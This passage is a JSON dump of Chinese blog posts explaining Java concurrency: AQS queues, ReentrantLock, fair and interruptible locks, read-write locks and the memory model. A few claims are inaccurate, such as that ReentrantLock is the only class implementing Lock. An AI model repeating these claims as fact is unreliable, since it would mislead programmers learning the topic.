new Thread(() -&gt; &#123; lock.lock(); try &#123; Thread.sleep(10000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125;); thread.start(); &#125; &#125;&#125; 实例代码中开启了5个线程，先获取锁之后再睡眠10S中，实际上这里让线程睡眠是想模拟出当线程无法获取锁时进入同步队列的情况。通过debug，当Thread-4（在本例中最后一个线程）获取锁失败后进入同步时，AQS时现在的同步队列如图所示： Thread-0先获得锁后进行睡眠，其他线程（Thread-1,Thread-2,Thread-3,Thread-4）获取锁失败进入同步队列，同时也可以很清楚的看出来每个节点有两个域：prev(前驱)和next(后继)，并且每个节点用来保存获取同步状态失败的线程引用以及等待状态等信息。另外AQS中有两个重要的成员变量： 12private transient volatile Node head;private transient volatile Node tail; 也就是说AQS实际上通过头尾指针来管理同步队列，同时实现包括获取锁失败的线程进行入队，释放锁时对同步队列中的线程进行通知等核心方法。其示意图如下： 通过对源码的理解以及做实验的方式，现在我们可以清楚的知道这样几点： 节点的数据结构，即AQS的静态内部类Node,节点的等待状态等信息； 同步队列是一个双向队列，AQS通过持有头尾指针管理同步队列； 那么，节点如何进行入队和出队是怎样做的了？实际上这对应着锁的获取和释放两个操作：获取锁失败进行入队操作，获取锁成功进行出队操作。 Reference 深入理解AbstractQueuedSynchronizer(AQS) - https://juejin.im/post/5aeb07ab6fb9a07ac36350c8 AQS深度剖析 - https://blog.csdn.net/u012152619/article/details/74977570","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】锁 - ReentrantLock 类","date":"2019-02-28T07:54:35.000Z","path":"2019/02/28/【Java】锁-ReentrantLock类/","text":"ReentrantLock 类ReentrantLock 重入锁，是实现了 Lock 接口的一个类，也是在实际编程中使用频率很高的一个锁。 ReentrantLock 具有以下特点： 支持重入性（reentrancy），表示能够对共享资源能够重复加锁，即当前线程获取该锁再次获取不会被阻塞。 支持公平锁（fair locking）和非公平锁（unfair locking）两种方式。 是可中断（Interruptible）锁，即是一个可以被中断持有的锁。 是可限时锁（Timed Lock）锁，可以传入一个超时值作为参数。当在到达超时时间前，仍然没有获得锁，则放弃对锁的持有申请。 ReentrantLock是基于乐观锁（Optimistic Locking）的实现。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。乐观锁实现的机制就是CAS操作（Compare and Swap）。 ReentrantLock内部实现主要通过AbstractQueuedSynchronizer类实现的，AbstractQueuedSynchronizer是抽象类， 可重入性的实现原理可重入锁（reentrancy locking）允许一个线程可以反复得到相同的一把锁， 本质上，可重入锁有一个与锁相关的获取计数器，如果拥有锁的某个线程尝试再次得到锁，那么获取计数器就加1。最终，当锁被释放两次后，该锁才会真正被释放。 获取可重入锁的实现ReentrantLock 是可重入锁，下面我们来看看 ReentrantLock 是怎样实现的，以非公平锁为例，判断当前线程能否获得锁为例，核心方法为 nonfairTryAcquire： 123456789101112131415161718192021final boolean nonfairTryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); //1. 如果该锁未被任何线程占有，该锁能被当前线程获取 if (c == 0) &#123; if (compareAndSetState(0, acquires)) &#123; setExclusiveOwnerThread(current); return true; &#125; &#125; //2.若被占有，检查占有线程是否是当前线程 else if (current == getExclusiveOwnerThread()) &#123; // 3. 再次获取，计数加一 int nextc = c + acquires; if (nextc &lt; 0) // overflow throw new Error(\"Maximum lock count exceeded\"); setState(nextc); return true; &#125; return false;&#125; 分析： 这段代码的逻辑也很简单，具体请看注释。 为了支持重入性，在第二步增加了处理逻辑，如果该锁已经被线程所占有了，会继续检查占有线程是否为当前线程，如果是的话，同步状态加1返回true，表示可以再次获取成功。 释放重入锁的实现每次重新获取都会对同步状态进行加一的操作，那么释放的时候处理思路是怎样的呢？ 依然还是以非公平锁为例，核心方法为 tryRelease： 123456789101112131415protected final boolean tryRelease(int releases) &#123; //1. 同步状态减1 int c = getState() - releases; if (Thread.currentThread() != getExclusiveOwnerThread()) throw new IllegalMonitorStateException(); boolean free = false; if (c == 0) &#123; //2. 只有当同步状态为0时，锁成功被释放，返回true free = true; setExclusiveOwnerThread(null); &#125; // 3. 锁未被完全释放，返回false setState(c); return free;&#125; 分析： 代码的逻辑请看注释，需要注意的是，重入锁的释放必须得等到同步状态为 0 时锁才算成功释放，否则锁仍未释放。 如果锁被获取n次，释放了n-1次，该锁未完全释放返回false，只有被释放n次才算成功释放，返回true。 到现在我们可以理清ReentrantLock重入性的实现了，也就是理解了同步语义的第一条。 公平锁与非公平锁ReentrantLock 支持两种情况：公平锁（fair locking）和非公平锁（unfair locking）。 何谓公平性（fairness），是针对获取锁而言的，如果一个锁是公平的，那么锁的获取顺序就应该符合线程请求锁时的绝对时间顺序，满足 FIFO。换句话说，等待时间最久的线程（最先请求的线程）会先获得该锁。 满足公平性的锁，就称为公平锁（fair locking），反之，称为非公平锁（unfair locking）。 ReentrantLock 的构造方法无参时是构造非公平锁，源码为： 1234public ReentrantLock() &#123; sync = new NonfairSync(); ...&#125; 另外还提供了另外一种方式，可传入一个boolean值，true 时为公平锁，false 时为非公平锁，源码为： 123public ReentrantLock(boolean fair) &#123; sync = fair ? new FairSync() : new NonfairSync();&#125; 在上面非公平锁获取时（nonfairTryAcquire方法）只是简单的获取了一下当前状态做了一些逻辑处理，并没有考虑到当前同步队列中线程等待的情况。我们来看看公平锁的处理逻辑是怎样的，核心方法为： 1234567891011121314151617181920protected final boolean tryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) &#123; if (!hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, acquires)) &#123; setExclusiveOwnerThread(current); return true; &#125; &#125; else if (current == getExclusiveOwnerThread()) &#123; int nextc = c + acquires; if (nextc &lt; 0) throw new Error(\"Maximum lock count exceeded\"); setState(nextc); return true; &#125; return false; &#125;&#125; 这段代码的逻辑与 nonfairTryAcquire 基本上一直，唯一的不同在于增加了hasQueuedPredecessors 的逻辑判断，从方法名上就可知道该方法用来判断当前节点在同步队列中是否有前驱节点，如果有前驱节点，说明有线程比当前线程更早的请求资源。 根据公平性，当前线程请求资源失败。如果当前节点没有前驱节点的话，才有做后面的逻辑判断的必要性。 公平锁每次都是从同步队列中的第一个节点获取到锁，而非公平性锁则不一定，有可能刚释放锁的线程能再次获取到锁。 公平锁 VS 非公平锁公平锁每次获取到锁为同步队列中的第一个节点，保证请求资源时间上的绝对顺序，而非公平锁有可能刚释放锁的线程下次继续获取该锁，则有可能导致其他线程永远无法获取到锁，造成“饥饿”现象（starvation）。 公平锁为了保证时间上的绝对顺序，需要频繁的上下文切换，而非公平锁会降低一定的上下文切换，降低性能开销。因此，ReentrantLock 默认选择的是非公平锁，则是为了减少一部分上下文切换，保证了系统更大的吞吐量。 可中断锁 （Interruptible Lock）ReentrantLock 是可中断锁 （Interruptible Lock），而 synchronized 并不提供中断机制。 可中断锁 （Interruptible Lock），顾名思义，就是可以被中断持有的锁。 比如，某一线程A正在执行锁中的代码，另一线程B正在等待获取该锁，由于等待时间过长，线程B急着想处理一个优先级相对更高的事务，我们可以让线程A中断自己正在持有的锁，或者线程B中断线程A正在持有的锁，这就是可中断锁。 可中断锁解决死锁可中断锁可以帮助解决死锁（deadlock）问题，比如： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import java.util.concurrent.locks.ReentrantLock;public class IntLock implements Runnable&#123; public static ReentrantLock lock1 = new ReentrantLock(); public static ReentrantLock lock2 = new ReentrantLock(); int lock; /** * 控制加锁顺序，产生死锁 */ public IntLock(int lock) &#123; this.lock = lock; &#125; public void run() &#123; try &#123; if (lock == 1) &#123; lock1.lockInterruptibly(); // 如果当前线程未被中断，则获取锁。 try &#123; Thread.sleep(500); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; lock2.lockInterruptibly(); System.out.println(Thread.currentThread().getName()+\"，执行完毕！\"); &#125; else &#123; lock2.lockInterruptibly(); try &#123; Thread.sleep(500); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; lock1.lockInterruptibly(); System.out.println(Thread.currentThread().getName()+\"，执行完毕！\"); &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; // 查询当前线程是否保持此锁。 if (lock1.isHeldByCurrentThread()) &#123; lock1.unlock(); &#125; if (lock2.isHeldByCurrentThread()) &#123; lock2.unlock(); &#125; System.out.println(Thread.currentThread().getName() + \"，退出。\"); &#125; &#125; public static void main(String[] args) throws InterruptedException &#123; IntLock intLock1 = new IntLock(1); IntLock intLock2 = new IntLock(2); Thread thread1 = new Thread(intLock1, \"线程1\"); Thread thread2 = new Thread(intLock2, \"线程2\"); thread1.start(); thread2.start(); Thread.sleep(1000); thread2.interrupt(); // 中断线程2，且释放线程2持有的所有锁，同时放弃所有锁申请 &#125;&#125; 上述例子中，线程 thread1 和 thread2 启动后，thread1 立刻先占用 lock1，等待 500ms 后，再占用 lock2；thread2 反之，立刻先占 lock2，等待 500ms 后，后占 lock1。这便形成 thread1 和 thread2 之间的死锁。 当代码运行到 Thread.sleep(1000); 时，main 线程处于休眠（sleep）状态，两线程此时处于死锁的状态，thread2.interrupt(); 导致 thread2 被中断（interrupt），且释放 thread2 持有的所有锁，故 thread2 会放弃对 lock1 的申请。这个操作导致 thread1 最终顺利获得 lock2，从而最终解开了死锁。 可限时锁（Timed Lock）除了可中断锁外，可限时锁（Timed Lock）也可以在有些情况下避免死锁的发生。 ReentrantLock 是一种可限时锁（Timed Lock），它提供了 tryLock() 方法，并传入一个超时值作为参数。当在到达超时时间前，仍然没有获得锁，则放弃对锁的持有申请。 1234567891011121314151617181920212223242526272829303132333435363738package concurrency.in.practice;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.ReentrantLock;public class TryLockTest extends Thread &#123; public static ReentrantLock lock = new ReentrantLock(); public TryLockTest(String name)&#123; super(name); &#125; @Override public void run() &#123; try &#123; if (lock.tryLock(5, TimeUnit.SECONDS)) &#123; Thread.sleep(6000); &#125; else &#123; System.out.println(this.getName() + \" get lock failed\"); &#125; &#125; catch (Exception e) &#123; &#125; finally &#123; if (lock.isHeldByCurrentThread()) &#123; System.out.println(\"lock.isHeldByCurrentThread: \" + this.getName()); lock.unlock(); &#125; &#125; &#125; public static void main(String[] args) &#123; TryLockTest t1 = new TryLockTest(\"TryLockTest1\"); TryLockTest t2 = new TryLockTest(\"TryLockTest2\"); t1.start(); t2.start(); &#125;&#125; 两个线程来争夺一把锁，由于获得锁的线程在获得锁后会 sleep 6 秒，而未获得的线程在尝试获取锁 5 秒后，仍未获得锁，则放弃对锁的请求。 所以必定有一个线程无法获得锁。无法获得后就直接退出了。 ReentrantLock 的优缺点优点ReentrantLock并不是一种替代内置加锁的方法，而是作为一种可选择的高级功能。 相比于 synchronized，ReentrantLock在功能上更加丰富，它具有可中断（interruptable）、可限时（timed）、公平/非公平（fair/unfair）等特点。 在 JDK 1.5 里面，ReentrantLock 的性能是明显优于 synchronized 的，但是在 JDK 1.6 里面，synchronized 做了优化，他们之间的性能差别已经不明显了。但是，对于竞争激烈的情况，ReentrantLock 的性能仍然明显优于 synchronized 。 缺点相比于 ReentrantLock ， synchronized 的特点是使用简单，一切交给 JVM 去处理，不需要显式释放。 从用法上可以看出，与 synchronized 相比， ReentrantLock就稍微复杂一点。因为必须在 finally 中进行解锁操作，如果不在 finally解锁，有可能代码出现异常锁没被释放， Conditionsynchronized 与 wait() 和 notify()/notifyAll() 方法相结合可以实现等待/通知模型。 ReentrantLock同样可以，但是需要借助 Condition，且 Condition 有更好的灵活性，具体体现在： 一个 Lock 里面可以创建多个 Condition 实例，实现多路通知； notify()方法进行通知时，被通知的线程时 Java 虚拟机随机选择的，但是 ReentrantLock 结合 Condition 可以实现有选择性地通知，这是非常重要的 例子 看一下利用 Condition 实现等待/通知模型的最简单用法，下面的代码注意一下，await() 和 signal() 之前，必须要先调用 lock() 以获得锁，使用完毕在finally 中 unlock() 释放锁，这和 wait()/notify()/notifyAll() 使用前必须先获得对象锁是一样的： 1234567891011121314151617181920212223242526272829303132333435363738public class MyThread extends Thread &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void run() &#123; await(); &#125; public void await() &#123; try &#123; lock.lock(); System.out.println(\"await时间为：\" + System.currentTimeMillis()); condition.await(); System.out.println(\"await等待结束\"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void signal() &#123; try &#123; lock.lock(); System.out.println(\"signal时间为：\" + System.currentTimeMillis()); condition.signal(); &#125; finally &#123; lock.unlock(); &#125; &#125; public static void main(String[] args) throws Exception &#123; MyThread mt = new MyThread(); mt.start(); Thread.sleep(3000); mt.signal(); &#125;&#125; 结果123await时间为：1551332210908signal时间为：1551332213908await等待结束 分析差值是 3000 毫秒也就是 3 秒，符合代码预期，成功利用 ReentrantLock 的 Condition 实现了等待/通知模型。 其实这个例子还证明了一点，调用 Condition 的 await() 方法时是释放锁的，原因也很简单，要是 await() 方法不释放锁，那么在进入 signal() 方法时，又怎么能调用到 Condition 的 signal() 方法呢？ Reference 《java并发编程的艺术》 ReentrantLock的使用 - https://www.jianshu.com/p/155260c8af6c 彻底理解ReentrantLock - https://juejin.im/post/5aeb0a8b518825673a2066f0 Java并发编程：Lock - https://www.cnblogs.com/dolphin0520/p/3923167.html Java多线程系列——深入重入锁ReentrantLock - https://www.cnblogs.com/zhengbin/p/6503412.html Java多线程11：ReentrantLock的使用和Condition - https://www.cnblogs.com/xrq730/p/4855155.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程-Java 锁的演化","date":"2019-02-28T03:20:56.000Z","path":"2019/02/28/【Java】锁-Java锁的演化/","text":"锁存在的问题Java 在 JDK1.5 之前都是靠 synchronized 关键字保证同步的，这种通过使用一致的锁定协议来协调对共享状态的访问，可以确保无论哪个线程持有共享变量的锁，都采用独占的方式来访问这些变量。独占锁（exclusive locking）其实就是一种悲观锁（pessimistic locking），所以说 synchronized 是一种悲观锁。 synchronized的缺陷 在多线程竞争下，加锁、释放锁会导致比较多的上下文切换和调度延时，引起性能问题。 一个线程持有锁会导致其它所有需要此锁的线程挂起。 如果一个优先级高的线程等待一个优先级低的线程释放锁会导致优先级倒置问题（priority inversion problem），引起性能风险。 而另一个更加有效的锁就是乐观锁（optimistic locking）。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。 与锁相比，volatile 变量是一个更轻量级的同步机制，因为在使用这些变量时不会发生上下文切换和线程调度等操作，但是 volatile 不能解决原子性问题，因此当一个变量依赖旧值时就不能使用 volatile 变量。因此对于同步最终还是要回到锁机制上来。 锁的完善如果使用 synchronized ，已经获取了锁的线程由于要等待I/O或者其他原因（比如调用sleep方法）被阻塞了，但是又没有释放锁，其他线程便只能干巴巴地等待。我们希望有一种机制，可以不让等待的线程一直无期限地等待下去（比如只等待一定的时间或者能够响应中断）。 或者，当在 synchronized 方法或代码块中读写文件时，任何的读操作或写操作两两操作会发生互斥现象。但是，为了提高效率，我们可能只希望写操作和写操作之间互斥现象，但是读操作和读操作是可以同时进行的（即不发生互斥）。 java.util.concurrent.locks 包中的 ReentrantLock 类和 ReentrantReadWriteLock 类正分别满足了上面的需求。 java.util.concurrent.lock 中的 Lock 框架是锁定的一个抽象，它允许把锁定的实现作为 Java 类，而不是作为语言的特性来实现。这就为 Lock 的多种实现留下了空间，各种实现可能有不同的调度算法、性能特性或者锁定语义。 ReentrantLock类实现了 Lock ，它拥有与 synchronized 相同的并发性和内存语义，但是添加了类似轮询锁、定时锁等候和可中断锁等候的一些特性。此外，它还提供了在激烈争用情况下更佳的性能。 java.util.concurrent.locks 包下常用的类下面我们就来探讨一下 java.util.concurrent.locks 包中常用的类和接口。 Lock 接口首先要说明的就是 Lock。Lock 是一个接口。 一般来说，使用Lock 接口（对应的实现类）必须在try{}catch{}块中进行，并且将释放锁的操作放在finally块中进行，以保证锁一定被被释放，防止死锁的发生。 通常使用 Lock 接口（对应的实现类）来进行同步的话，是以下面这种形式去使用的： 123456789Lock lock = ...;lock.lock();try&#123; //处理任务&#125;catch(Exception ex)&#123; &#125;finally&#123; lock.unlock(); //释放锁&#125; ReentrantLock 类ReentrantLock，意思是“可重入锁”（reentrancy locking）。ReentrantLock 类是唯一实现了 Lock 接口的类，并且 ReentrantLock 提供了更多的方法。 一个例子： 12345678910111213141516171819202122232425262728293031323334public class Test &#123; private ArrayList&lt;Integer&gt; arrayList = new ArrayList&lt;Integer&gt;(); public static void main(String[] args) &#123; final Test test = new Test(); new Thread()&#123; public void run() &#123; test.insert(Thread.currentThread()); &#125;; &#125;.start(); new Thread()&#123; public void run() &#123; test.insert(Thread.currentThread()); &#125;; &#125;.start(); &#125; public void insert(Thread thread) &#123; Lock lock = new ReentrantLock(); //注意这个地方 lock.lock(); try &#123; System.out.println(thread.getName()+\"得到了锁\"); for(int i=0;i&lt;5;i++) &#123; arrayList.add(i); &#125; &#125; catch (Exception e) &#123; // TODO: handle exception &#125;finally &#123; System.out.println(thread.getName()+\"释放了锁\"); lock.unlock(); &#125; &#125;&#125; ReadWriteLock接口ReadWriteLock也是一个接口，在它里面只定义了两个方法： 1234public interface ReadWriteLock &#123; Lock readLock(); Lock writeLock();&#125; 一个方法用来获取读锁，另一个用来获取写锁。 也就是说将文件的读写操作分开，分成2个锁来分配给线程，从而使得多个线程可以同时进行读操作。ReentrantReadWriteLock 类实现了 ReadWriteLock 接口。 ReentrantReadWriteLock 类ReentrantReadWriteLock 类里面提供了很多丰富的方法，不过最主要的有两个方法：readLock() 和 writeLock() 用来获取读锁和写锁。 假如有多个线程要同时进行读操作的话： 12345678910111213141516171819202122232425262728293031323334public class Test &#123; private ReentrantReadWriteLock rwl = new ReentrantReadWriteLock(); public static void main(String[] args) &#123; final Test test = new Test(); new Thread()&#123; public void run() &#123; test.get(Thread.currentThread()); &#125;; &#125;.start(); new Thread()&#123; public void run() &#123; test.get(Thread.currentThread()); &#125;; &#125;.start(); &#125; public void get(Thread thread) &#123; rwl.readLock().lock(); try &#123; long start = System.currentTimeMillis(); while(System.currentTimeMillis() - start &lt;= 1) &#123; System.out.println(thread.getName()+\"正在进行读操作\"); &#125; System.out.println(thread.getName()+\"读操作完毕\"); &#125; finally &#123; rwl.readLock().unlock(); &#125; &#125;&#125; 执行结果1234567Thread-0正在进行读操作Thread-0正在进行读操作Thread-1正在进行读操作Thread-0正在进行读操作Thread-1正在进行读操作Thread-0正在进行读操作... 分析说明 thread1 和 thread2 在同时进行读操作，这样就大大提升了读操作的效率。 需要注意的是，如果有一个线程已经占用了读锁，则此时其他线程如果要申请写锁，则申请写锁的线程会一直等待直到读锁被释放。 如果有一个线程已经占用了写锁，则此时其他线程如果申请写锁或者读锁，则申请的线程需要一直等待直到写锁被释放。 Lock 接口和 synchronized 关键字的选择总结来说，Lock 接口和 synchronized 关键字有以下几点不同： Lock 是一个接口，而 synchronized 是 Java 中的关键字，synchronized是内置的语言实现； 采用 synchronized 不需要用户去手动释放锁，当 synchronized 方法或者 synchronized 代码块执行完之后，系统会自动让线程释放对锁的占用；而 Lock 则必须要用户去手动显式地释放锁，如果没有主动释放锁，就有可能导致出现死锁现象； synchronized 在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而 Lock 在发生异常时，如果没有主动通过 unLock() 去释放锁，则很可能造成死锁现象，因此使用 Lock 时需要在 finally 块中释放锁； Lock 可以让等待锁的线程响应中断，而 synchronized 却不行，使用synchronized 时，等待的线程会一直等待下去，不能够响应中断； 通过 Lock 可以知道某个线程有没有成功获取锁，而 synchronized 却无法办到； Lock 可以提高多个线程进行读操作的效率。 在性能上来说，如果竞争资源不激烈，两者的性能是差不多的，而当竞争资源非常激烈时（即有大量线程同时竞争），此时 Lock 的性能要远远优于synchronized。所以说，在具体使用时要根据适当情况选择。 synchronized 关键字和 Reentrantlock 类异同相同点 都实现了多线程同步 都保证了原子性（atomicity）和可见性（visibility） 都是可重入锁（reentrant lock） 不同点实现机制不同 synchronized 关键字通过 Java 对象头锁标记和 Monitor 对象实现 Reentrantlock 类通过CAS、AQS（AbstractQueuedSynchronizer）和 locksupport（用于阻塞和解除阻塞）实现 synchronized 依赖 JVM 内存模型保证包含共享变量的多线程内存可见性 Reentrantlock 类通过 AQS 的 volatile state 保证包含共享变量的多线程内存可见性 使用方式不同 synchronized 可以修饰实例方法（锁住实例对象）、静态方法（锁住类对象）、代码块（显示指定锁对象） Reentrantlock 类需要显式调用 trylock()/lock() 方法，且需要在 finally 块中调用 unlock() 以释放锁 功能丰富程度不同 Reentrantlock 提供有限时间等候锁（设置过期时间）、可中断锁（lockInterruptibly）、condition（提供await、signal等方法）等丰富语义 Reentrantlock 提供公平锁和非公平锁实现 synchronized 不可设置等待时间、不可被中断（interrupted） Reference 《深入理解Java虚拟机》 JDK 5.0 中更灵活、更具可伸缩性的锁定机制 - https://www.ibm.com/developerworks/cn/java/j-jtp10264/index.html Java进阶（二）当我们说线程安全时，到底在说什么 - http://www.jasongj.com/java/thread_safe/ Java并发编程：Lock - https://www.cnblogs.com/dolphin0520/p/3923167.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程-Java 保证原子性、有序性、可见性","date":"2019-02-28T03:15:38.000Z","path":"2019/02/28/【Java】多线程-Java-保证原子性、有序性、可见性/","text":"线程安全（Thread Safety）概念 当一个可变（mutable）对象会被多个线程访问时，就要考虑这个线程是不是需要被设计成线程安全的。 一个类会被称为线程安全（thread-safe）的，当它被从多个线程访问，而且无论这些线程如何被调度（scheduling）和交叉（interleaving）执行，而且在调用代码（calling code）中不需要额外的同步（synchronization）或者其他协调（coordiantion）机制，它的行为仍然正确（若预期执行）。 换句话说，线程安全的类封装（encapsulate）了已经需要的同步机制，因此客户端或者说调用者不再需要关注或者提供这些同步机制。 Java 内存模型是围绕着并发编程中原子性（atomicity）、可见性（visibility）以及有序性（ordering）这三个特征来建立的。 那么， Java 语言本身对这三个特性提供了哪些保证呢？ Java 如何保证原子性（atomicity）常用的保证 Java 操作原子性的工具是锁（Lock）、 synchronized 方法（或者 synchronized 代码块）或原子类（Atomic Classes）。 锁（Lock）使用锁，可以保证同一时间只有一个线程能拿到锁，也就保证了同一时间只有一个线程能执行申请锁和释放锁之间的代码。 123456789public void testLock () &#123; lock.lock(); try&#123; int j = i; i = j + 1; &#125; finally &#123; lock.unlock(); &#125;&#125; 同步方法/块（synchronized 关键字）与锁类似的是同步方法（synchronized 方法）或者同步代码块（ synchronized 块）。 声明非静态 synchronized 方法时，锁住的是当前实例； 声明静态 synchronized 方法时，锁住的是该方法对应类的 Class 对象；使用 synchronized 代码块时，锁住的是synchronized关键字后面括号内的对象。 下面是 synchronized 代码块的示例： 123456public void testLock () &#123; synchronized (anyObject)&#123; int j = i; i = j + 1; &#125;&#125; 分析值得一提的是，为了保证目标代码段（临界区）的原子性，当锁定了同一个对象时，在一个synchronized方法/块执行完成前，另一个synchronized方法/块永远不会被执行，即使前一个synchronized方法/块执行的时间非常长。 123456789101112131415161718192021222324252627282930public class Test &#123; public static void main(String[] args) &#123; new Thread(() -&gt; &#123; try &#123; Thread.sleep(100); testA(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;).start(); new Thread(() -&gt; &#123; try &#123; testB(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;).start(); ; &#125; public static synchronized void testA() &#123; System.out.println(\"aaa\"); &#125; public static synchronized void testB() throws InterruptedException &#123; Thread.sleep(30000); System.out.println(\"bbb\"); &#125;&#125; 比如在上面的例子中，testB() 方法会被执行长达30秒，虽然这个方法对应的执行线程在执行过程中，肯定会因为CPU时间片被用完从而被置为就绪态。但是，由于执行testB() 方法的线程先获得Monitor，执行testA() 方法的线程也只有等待前者执行完成后，才有机会执行（即使testB() 方法会被执行长达30秒）。 换句话说，这段代码的输出永远是： 12bbbaaa 总结无论使用锁还是 synchronized 关键字，本质都是一样，通过锁来实现资源的排它访问（mutual exclusion），从而实现临界区（critical regions）在同一时间只能被一个线程执行，进而保证了目标代码段（临界区）的原子性。这是一种以牺牲性能为代价的方法。 原子类（Atomic Classes）Java 中提供了对应的原子操作类来实现该操作，并保证原子性，其本质是利用了 CPU 级别的指令来实现 CAS （compare and swap）操作。由于是 CPU 级别的指令，其开销比需要操作系统参与的锁的开销小。 比如，AtomicInteger 的使用方法如下： 12345678AtomicInteger atomicInteger = new AtomicInteger();for(int b = 0; b &lt; numThreads; b++) &#123; new Thread(() -&gt; &#123; for(int a = 0; a &lt; iteration; a++) &#123; atomicInteger.incrementAndGet(); &#125; &#125;).start();&#125; Java 如何保证有序性（ordering）上文讲过编译器和处理器对指令进行重新排序时，会保证重新排序后的执行结果和代码顺序执行的结果一致，所以重新排序过程并不会影响单线程程序的执行，却可能影响多线程程序并发执行的正确性。 Java 中可通过 volatile 在一定程序上保证顺序性，另外还可以通过 synchronized 和锁（lock）来保证顺序性。 synchronized 和锁保证顺序性的原理和保证原子性一样，都是通过保证同一时间只会有一个线程执行目标代码段来实现的。 除了从应用层面保证目标代码段执行的顺序性外，JVM 还通过被称为 happens-before 原则隐式地保证顺序性。两个操作的执行顺序只要可以通过 happens-before 推导出来，则 JVM 会保证其顺序性，反之 JVM 对其顺序性不作任何保证，可对其进行任意必要的重新排序以获取高效率。 Java 如何保证可见性（visibility）一个变量具有可见性（visibility），是指，当一个线程修改了这个变量的值，新值（或者是说这个修改操作）对于其他线程是可以立刻感知的。所谓立刻感知，是指只要在这个修改操作完成后，其他线程在任意时刻去读取这个变量时，都能获取到这个这个变量的新值。 而普通的共享变量并不能被保证可见性，因为在一个线程中修改了普通共享变量后，这个修改操作什么时候被同步更新到主存是不确定的。因此，当其他线程去读取这个变量时，主存中可能还是原来的旧值，因此自然读取到旧值（即使线程A的修改操作的执行在时间上早于线程B的读取操作），所以无法保证变量的可见性。 volatileJava 提供了 volatile 关键字来保证变量的可见性。 当一个共享变量被 volatile 修饰时，JVM 会保证当其被修改时，会立即（从工作内存）被更新到主存中，且当有其他线程需要读取时，它会去内存中读取新值（触发缓存行失效）。 换句话说，volatile变量对所有线程是立即可见的，即对volatile变量是所有的写操作都能立刻反应到其他线程之中。 synchronized 关键字和 Lock另外，通过 synchronized 关键字和 Lock 也能够保证可见性，synchronized 关键字和 Lock 能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存当中。因此可以保证可见性。 JMM 关于 synchronized 的两条规定: 线程解锁前，必须要共享变量的最新值刷新到主内存中； 线程加锁前，将清空工作内存中共享变量的值，从而使用共享变量时需要从主内存中重新读取最新的值。 final 关键字final 关键字的可见性是指：被 final 修饰的域（fiele）在构造器中一旦初始化完成，并且构造器没有把“this”引用传递出去（即没有出现“this”逸出），就具有可见性（即在其它线程中，能够看见这个 final 域的被初始化后的值）。 例子12345678910111213141516171819202122public class FinalDemo &#123; private int a; //普通域 private final int b; //final域 private static volatile FinalDemo finalDemo; public FinalDemo() &#123; a = 1; // 1. 写普通域 b = 2; // 2. 写final域 &#125; public static void writer() &#123; finalDemo = new FinalDemo(); &#125; public static void reader() &#123; if (finalDemo != null)&#123; FinalDemo demo = finalDemo; // 3.读对象引用 int a = demo.a; //4.读普通域 int b = demo.b; //5.读final域 &#125; &#125;&#125; 假设线程A先执行writer()方法，在此之后线程B执行reader()方法。 注意，这里我们假设”线程A先执行writer()方法，在此之后线程B执行reader()方法”，而（在实践中）如果只是将这两个方法分别传入两个Thread对象，这两个线程的先后执行顺序是完全未知的。 因此，在进行以下讨论时，我们暂且认为假设的执行顺序已经得到了保障。 规则JVM 禁止将final域的写操作，重排序到构造函数之外。这个规则的实现主要包含了两个方面： JMM禁止编译器把final域的写重排序到构造函数之外； 编译器会在final域的写操作之后，构造函数return之前，插入一个storestore屏障。这个屏障可以禁止处理器把final域的写操作，重排序到构造函数之外。 分析由于a，b之间没有数据依赖性，普通域（普通变量）a可能会被重排序到构造函数之外，线程B就有可能读到普通变量a初始化之前的值（零值），这样就可能出现错误。而对于final域变量b，根据重排序规则，会禁止final修饰的变量b重排序到构造函数之外（意味着变量b能够在FinalDemo对象实例的构造函数执行完成前被赋值），因而线程B就能够读到final变量初始化后的值。 因此，final域写操作的重排序规则可以确保：在对象引用为任意线程可见之前，对象的final域已经被正确初始化过了，而普通域就不具有这个保障。 Reference 《深入理解Java虚拟机》 Java进阶（二）当我们说线程安全时，到底在说什么 - http://www.jasongj.com/java/thread_safe/ Java并发编程：Lock - https://www.cnblogs.com/dolphin0520/p/3923167.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - 原子类（Atomic Classes）","date":"2019-02-27T13:47:46.000Z","path":"2019/02/27/【Java】多线程-原子类（Atomic-Classes）/","text":"背景我们知道 volatile 关键字虽然轻量级，但不能保证原子性，synchronized 可以保证原子性，但是比较重量级。 那么有没有一种简单的、性能高的方法来保证 Java 的原子操作呢？答案当然是有的。 在 JDK1.5 时期， Java 家族加入了 Atomic 包。 原子类（Atomic Classes）Java 